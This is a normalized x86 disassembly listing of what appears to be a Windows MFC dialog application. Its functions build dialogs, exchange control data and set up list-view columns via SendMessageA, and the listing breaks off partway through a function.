add esp 0x10
retn
sub_415190
push 0xffffffff
push sub_4606a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0x0
call sub_4477b8
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4151d0
push 0xffffffff
push sub_460735
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x91
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x1c ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x14c ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x150 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x154 ]
mov [ ebp ] eax
push 0x0
lea ecx [ esi + 0x158 ]
mov [ esp + 0x20 ] 0x7
call sub_417770
push rw-data
mov ecx edi
mov [ esp + 0x20 ] 0x8
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_415310
push 0xffffffff
push sub_46079c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x134 ]
mov [ esp + 0x10 ] 0x6
call sub_442148
lea ecx [ esi + 0x128 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0x124 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4153c0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x41a
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x416
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3ea
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3f6
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x3f6
push edi
call sub_449495
lea edx [ esi + 0x150 ]
push edx
push 0x3ea
push edi
call sub_449495
add esi 0x154
push esi
push 0x416
push edi
call sub_449495
pop edi
pop esi
retn 0x4
sub_415460
push 0xffffffff
push sub_46083f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x35c
push ebp
push esi
push edi
mov esi ecx
call sub_43e113
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
push 0x0
lea ecx [ esp + 0x14 ]
mov [ esp + 0x374 ] 0x0
call sub_40a470
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x374 ] 0x1
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xd8 ]
mov edi [ SendMessageA@IAT ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x254 ]
call sub_40c9c0
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x374 ] 0x2
call sub_4422d1
mov eax [ esp + 0xc ]
push 0x0
push eax
push 0xffffffff
lea ecx [ esp + 0x25c ]
call sub_42182c
test eax eax
jne r-xdata
mov edx [ esp + 0x120 ]
mov eax [ esi + 0x12c ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
mov eax [ esp + 0x318 ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x250 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x13c ]
call sub_40d5c0
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x374 ] 0x3
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x144 ]
call sub_42182c
test eax eax
jne r-xdata
mov ecx [ esp + 0x364 ]
mov edx [ esi + 0xf0 ]
push ecx
push 0x0
push 0x143
push edx
call edi
mov eax [ esp + 0x250 ]
push 0x1
push 0x1
lea ecx [ esp + 0x258 ]
call [ eax + 0x14 ]
mov eax [ esp + 0x318 ]
test eax eax
je r-xdata
mov eax [ esp + 0x200 ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x138 ]
call sub_421900
push 0xffffffff
push 0xffffffff
lea ebp [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x5
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x6
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x7
mov ecx ebp
call sub_43c126
mov eax [ esi + 0x78 ]
push 0x64
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x3c
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x3c
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x3c
push 0x3
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x4
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x3c
push 0x5
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x3c
push 0x6
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x3c
push 0x7
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push edx
call edi
lea ecx [ esp + 0x24c ]
mov [ esp + 0x370 ] 0x5
call sub_442148
lea ecx [ esp + 0x248 ]
mov [ esp + 0x370 ] 0x4
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x370 ] 0x2
call sub_421723
lea ecx [ esp + 0x364 ]
mov [ esp + 0x370 ] 0x6
call sub_442148
lea ecx [ esp + 0x250 ]
mov [ esp + 0x370 ] 0x1
call sub_421723
lea ecx [ esp + 0x134 ]
mov [ esp + 0x370 ] 0xc
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x370 ] 0xb
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x370 ] 0xa
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x370 ] 0x9
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x370 ] 0x8
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x370 ] 0x7
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x370 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x370 ] 0xffffffff
call sub_442148
mov eax 0x1
mov ecx [ esp + 0x368 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x368
retn
mov edx [ esp + 0x24c ]
mov eax [ esi + 0xb4 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x138 ]
push 0x1
push 0x1
lea ecx [ esp + 0x140 ]
call [ edx + 0x14 ]
mov eax [ esp + 0x200 ]
test eax eax
je r-xdata
sub_4158a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4608a8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c0
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x14c ]
xor edi edi
cmp [ eax - 0x8 ] edi
jne r-xdata
mov ecx [ esi + 0x150 ]
cmp [ ecx - 0x8 ] edi
jne r-xdata
push edi
push edi
push rw-data
call sub_4496b7
jmp r-xdata
mov edx [ esi + 0x154 ]
push edi
push edi
cmp [ edx - 0x8 ] edi
jne r-xdata
push edi
push edi
push rw-data
call sub_4496b7
jmp r-xdata
mov ecx [ esp + 0x4d0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x4cc
retn
mov eax [ esi + 0x78 ]
mov ebx [ SendMessageA@IAT ]
push 0x1009
push eax
call ebx
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebx
mov edx [ rw-data ]
mov [ esp + 0x14 ] edx
push rw-data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x4dc ] edi
call sub_4421b6
lea ecx [ esp + 0x30 ]
mov [ esp + 0x4d8 ] 0x1
call sub_420d1c
push 0x1
push rw-data
push edi
push edi
push rw-data
lea ecx [ esp + 0x44 ]
mov [ esp + 0x4ec ] 0x2
call sub_420de1
lea eax [ esp + 0x30 ]
lea ecx [ esp + 0x90 ]
push eax
call sub_421517
lea ecx [ esp + 0x30 ]
mov [ esp + 0x4d8 ] 0x3
push ecx
lea ecx [ esp + 0x3c4 ]
call sub_421517
lea edx [ esp + 0x30 ]
lea ecx [ esp + 0x2b0 ]
push edx
mov [ esp + 0x4dc ] 0x4
call sub_421517
lea eax [ esp + 0x30 ]
lea ecx [ esp + 0x1a0 ]
push eax
mov [ esp + 0x4dc ] 0x5
call sub_421517
mov ecx [ esi + 0x154 ]
mov edx [ esi + 0x150 ]
mov eax [ esi + 0x14c ]
push ecx
push edx
push eax
lea ecx [ esp + 0x20 ]
push rw-data
push ecx
mov [ esp + 0x4ec ] 0x6
call sub_43b5cc
mov edx [ esp + 0x28 ]
add esp 0x14
lea ecx [ esp + 0x90 ]
push edi
push edx
push 0x2
call sub_42182c
test eax eax
jne r-xdata
push rw-data
call sub_4496b7
jmp r-xdata
push rw-data
lea ecx [ esp + 0x1c ]
call sub_4421b6
mov eax [ esp + 0x158 ]
mov [ esp + 0x4d8 ] 0x7
cmp eax edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x90 ]
call sub_421900
mov eax [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push eax
call ebx
lea ebp [ esi + 0x5c ]
lea ecx [ esp + 0x1a0 ]
mov [ esp + 0x4d8 ] 0x5
call sub_421723
lea ecx [ esp + 0x2b0 ]
mov [ esp + 0x4d8 ] 0x4
call sub_421723
lea ecx [ esp + 0x3c0 ]
mov [ esp + 0x4d8 ] 0x3
call sub_421723
lea ecx [ esp + 0x90 ]
mov [ esp + 0x4d8 ] 0x2
call sub_421723
lea ecx [ esp + 0x30 ]
mov [ esp + 0x4d8 ] 0x1
call sub_420d99
lea ecx [ esp + 0x10 ]
mov [ esp + 0x4d8 ] 0x0
call sub_442148
lea ecx [ esp + 0x14 ]
mov [ esp + 0x4d8 ] 0xffffffff
call sub_442148
lea ecx [ esp + 0x90 ]
call sub_421900
push 0x0
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x3c0 ]
push eax
push rw-data
call sub_422003
mov ecx [ esp + 0x10 ]
push ecx
push 0x2
push edi
mov ecx ebp
call sub_43c1c5
lea ecx [ esp + 0x3c0 ]
call sub_421900
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x90 ]
push edx
push rw-data
call sub_422003
mov eax [ esp + 0x10 ]
push eax
call sub_42d7e5
cdq
idiv ebx
lea ecx [ esp + 0x20 ]
push 0xa
push ecx
push eax
call sub_42d5cd
add esp 0x10
lea edx [ esp + 0x1c ]
mov ecx ebp
push edx
push 0x3
push edi
call sub_43c1c5
mov eax [ esp + 0x18 ]
mov ecx [ esi + 0x154 ]
mov edx [ esi + 0x150 ]
push eax
mov eax [ esi + 0x14c ]
push ecx
push edx
push eax
lea ecx [ esp + 0x24 ]
push rw-data
push ecx
call sub_43b5cc
mov edx [ esp + 0x2c ]
add esp 0x18
lea ecx [ esp + 0x2b0 ]
push 0x0
push edx
push 0x2
call sub_42182c
test eax eax
je r-xdata
lea ecx [ esp + 0x18 ]
mov [ esp + 0x4d8 ] 0x6
call sub_442148
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x2b0 ]
push eax
push rw-data
call sub_422003
mov ecx [ esp + 0x10 ]
push ecx
push 0x4
push edi
mov ecx ebp
call sub_43c1c5
lea ecx [ esp + 0x2b0 ]
call sub_421900
mov edx [ esp + 0x10 ]
push edx
call sub_42d7e5
mov ecx ebx
push 0xa
sub ecx eax
lea eax [ esp + 0x24 ]
push eax
lea eax [ ecx + ecx * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
cdq
idiv ebx
push eax
call sub_42d5cd
add esp 0x10
lea ecx [ esp + 0x1c ]
push ecx
push 0x5
push edi
mov ecx ebp
call sub_43c1c5
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x154 ]
mov ecx [ esi + 0x150 ]
push edx
mov edx [ esi + 0x14c ]
push eax
push ecx
push edx
lea eax [ esp + 0x24 ]
push rw-data
push eax
call sub_43b5cc
mov ecx [ esp + 0x2c ]
add esp 0x18
push 0x0
push ecx
push 0x2
lea ecx [ esp + 0x1ac ]
call sub_42182c
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x1a0 ]
push edx
push rw-data
call sub_422003
mov eax [ esp + 0x10 ]
mov ecx ebp
push eax
push 0x6
push edi
call sub_43c1c5
lea ecx [ esp + 0x1a0 ]
call sub_421900
mov ecx [ esp + 0x10 ]
push ecx
call sub_42d7e5
lea eax [ eax + eax * 4 ]
lea edx [ esp + 0x20 ]
push 0xa
push edx
lea eax [ eax + eax * 4 ]
shl eax 0x2
cdq
idiv ebx
push eax
call sub_42d5cd
add esp 0x10
lea eax [ esp + 0x1c ]
mov ecx ebp
push eax
push 0x7
push edi
call sub_43c1c5
mov edx [ esp + 0x90 ]
push 0x1
push 0x1
lea ecx [ esp + 0x98 ]
inc edi
call [ edx + 0x14 ]
mov eax [ esp + 0x158 ]
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x90 ]
push eax
push rw-data
call sub_422003
mov ecx [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push edi
push 0x1
mov ecx ebp
call sub_43c179
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push edx
call sub_442281
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x90 ]
push eax
push rw-data
call sub_422003
mov ecx [ esp + 0x10 ]
push ecx
call sub_42d7e5
mov edx [ esp + 0x14 ]
add esp 0x4
mov ecx ebp
mov ebx eax
push edx
push 0x1
push edi
call sub_43c1c5
mov eax [ esp + 0x18 ]
mov ecx [ esi + 0x154 ]
mov edx [ esi + 0x150 ]
push eax
mov eax [ esi + 0x14c ]
push ecx
push edx
push eax
lea ecx [ esp + 0x24 ]
push rw-data
push ecx
call sub_43b5cc
mov edx [ esp + 0x2c ]
add esp 0x18
lea ecx [ esp + 0x3c0 ]
push 0x0
push edx
push 0x2
call sub_42182c
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_415e10
push 0xffffffff
push sub_4608de
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x8f
mov [ esp + 0x10 ] esi
call sub_43ddd5
mov edx [ rw-data ]
lea ecx [ esi + 0x60 ]
xor eax eax
mov [ esp + 0x14 ] eax
mov [ ecx ] edx
mov edx [ rw-data ]
lea edi [ esi + 0x64 ]
mov [ edi ] edx
push rw-data
mov [ esp + 0x18 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x5c ] eax
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
mov ecx [ esp + 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_415ec0
push 0xffffffff
push sub_460903
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x64 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x60 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_415f20
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3f0
push edi
call sub_449443
lea ecx [ esi + 0x60 ]
push ecx
push 0x41c
push edi
call sub_4493f1
add esi 0x64
push esi
push 0x41b
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_415f90
push 0xffffffff
push sub_4609a1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x8e
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x1c ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x14c ]
mov [ esp + 0x1c ] 0x4
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x188 ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x18c ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x190 ]
mov [ ebp ] eax
mov ecx [ rw-data ]
mov [ esi + 0x194 ] ecx
push 0x0
lea ecx [ esi + 0x198 ]
mov [ esp + 0x20 ] 0x9
call sub_417770
push rw-data
mov ecx edi
mov [ esp + 0x20 ] 0xa
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0x194 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_416100
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x416
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3ea
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3eb
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3f6
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x41a
push edi
call sub_449556
lea edx [ esi + 0x188 ]
push edx
push 0x3f6
push edi
call sub_449495
lea eax [ esi + 0x18c ]
push eax
push 0x3eb
push edi
call sub_449495
lea ecx [ esi + 0x190 ]
push ecx
push 0x3ea
push edi
call sub_449495
add esi 0x194
push esi
push 0x416
push edi
call sub_449495
pop edi
pop esi
retn 0x4
sub_4161c0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4609b8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x188 ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x190 ]
mov eax [ ecx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0x14
retn
mov edx [ esi + 0x194 ]
mov eax [ edx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0x14
retn
mov eax [ esi + 0x18c ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0x14
retn
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
mov edx [ esi + 0x18c ]
mov eax [ esi + 0x194 ]
mov ecx [ esi + 0x190 ]
push edx
mov edx [ esi + 0x188 ]
push eax
push ecx
push edx
lea eax [ esp + 0x18 ]
push rw-data
push eax
mov [ esp + 0x30 ] 0x0
call sub_43b5cc
mov eax [ esp + 0x20 ]
mov edx [ esi + 0x198 ]
add esp 0x18
lea edi [ esi + 0x198 ]
mov ecx edi
push 0x0
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0x14
retn
mov eax [ esi + 0x234 ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
mov ecx esi
call sub_416360
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x14
retn
push ecx
lea edx [ esp + 0xc ]
mov ecx esp
mov [ esp + 0x10 ] esp
push edx
call sub_441ebd
mov ecx esi
call sub_416540
sub_416360
push 0xffffffff
push sub_4609e6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x238
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi ecx
mov [ esp + 0xc ] eax
push 0x0
lea ecx [ esp + 0x30 ]
mov [ esp + 0x250 ] 0x0
call sub_41e710
mov ecx [ edi + 0x188 ]
lea eax [ edi + 0x188 ]
push ecx
lea edx [ esp + 0x10 ]
push rw-data
push edx
mov [ esp + 0x258 ] 0x1
mov [ esp + 0x2c ] eax
call sub_43b5cc
mov eax [ esp + 0x18 ]
add esp 0xc
or ebx 0xffffffff
lea ecx [ esp + 0x2c ]
push 0x0
push eax
push ebx
call sub_42182c
test eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
mov ecx edi
call sub_43fe9c
jmp r-xdata
mov edx [ edi + 0x198 ]
lea esi [ edi + 0x198 ]
push 0x0
push 0x0
push ebx
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x2c ]
mov [ esp + 0x24c ] 0x0
call sub_410040
lea ecx [ esp + 0xc ]
mov [ esp + 0x24c ] ebx
call sub_442148
mov ecx [ esp + 0x244 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x244
retn
mov eax [ esp + 0xf4 ]
test eax eax
jne r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
lea ecx [ esp + 0x2c ]
call sub_421900
lea eax [ edi + 0x2b8 ]
lea ecx [ edi + 0x18c ]
lea edx [ edi + 0x2bc ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] ecx
mov [ esp + 0x10 ] edx
push ebp
lea eax [ edi + 0x190 ]
lea ecx [ edi + 0x2b0 ]
lea edx [ edi + 0x194 ]
lea ebp [ edi + 0x2b4 ]
lea ebx [ edi + 0x2ac ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x28 ] edx
add edi 0x2c0
mov eax [ esi ]
mov ecx esi
call [ eax + 0x20 ]
lea ecx [ esp + 0x140 ]
push ecx
mov ecx ebp
call sub_442281
mov edx [ esp + 0x24 ]
mov ecx ebx
push edx
call sub_442281
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x144 ]
push eax
call sub_442281
mov ecx [ esp + 0x2c ]
push ecx
mov ecx [ esp + 0x18 ]
call sub_442281
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
push edx
call sub_442281
mov eax [ esp + 0x28 ]
mov ecx edi
push eax
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esp + 0x30 ]
push 0x1
push 0x1
lea ecx [ esp + 0x38 ]
call [ eax + 0x14 ]
mov eax [ esp + 0xf8 ]
test eax eax
je r-xdata
or ebx 0xffffffff
pop ebp
sub_416540
push 0xffffffff
push sub_4609f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov esi ecx
mov eax [ esi + 0x168 ]
mov ebx [ SendMessageA@IAT ]
xor edi edi
push edi
push edi
push 0x1009
push eax
mov [ esp + 0x3c ] edi
call ebx
mov ecx [ esi + 0x168 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov eax [ esp + 0x34 ]
mov edx [ esi + 0x198 ]
lea ebp [ esi + 0x198 ]
push edi
push eax
push 0xffffffff
mov ecx ebp
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x260 ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ ebp ]
mov ecx ebp
call [ eax + 0x10 ]
mov ecx [ esi + 0x168 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
lea ebx [ esi + 0x14c ]
lea ecx [ esp + 0x34 ]
mov [ esp + 0x2c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20
retn 0x4
mov edx [ esi + 0x2a8 ]
lea ecx [ esp + 0x10 ]
push 0xa
push ecx
push edx
call sub_42d656
add esp 0xc
lea eax [ esp + 0x10 ]
mov ecx ebx
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
call sub_43c179
mov eax [ esi + 0x2b4 ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x2b8 ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov eax [ esi + 0x2bc ]
mov ecx ebx
push eax
push 0x3
push edi
call sub_43c1c5
mov edx [ esi + 0x2c4 ]
lea ecx [ esp + 0x10 ]
push 0xa
push ecx
push edx
call sub_42d656
add esp 0xc
lea eax [ esp + 0x10 ]
mov ecx ebx
push eax
push 0x4
push edi
call sub_43c1c5
mov edx [ esi + 0x2c8 ]
lea ecx [ esp + 0x10 ]
push 0xa
push ecx
push edx
call sub_42d656
add esp 0xc
lea eax [ esp + 0x10 ]
mov ecx ebx
push eax
push 0x5
push edi
call sub_43c1c5
mov eax [ esi + 0x2cc ]
mov ecx ebx
push eax
push 0x6
push edi
call sub_43c1c5
mov edx [ ebp ]
push 0x1
push 0x1
mov ecx ebp
inc edi
call [ edx + 0x14 ]
mov eax [ esi + 0x260 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_4166f0
push 0xffffffff
push sub_460ac0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x474
push ebp
push esi
push edi
mov esi ecx
call sub_43e113
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
push 0x0
lea ecx [ esp + 0x14 ]
mov [ esp + 0x48c ] 0x0
call sub_40a470
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x48c ] 0x1
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xd8 ]
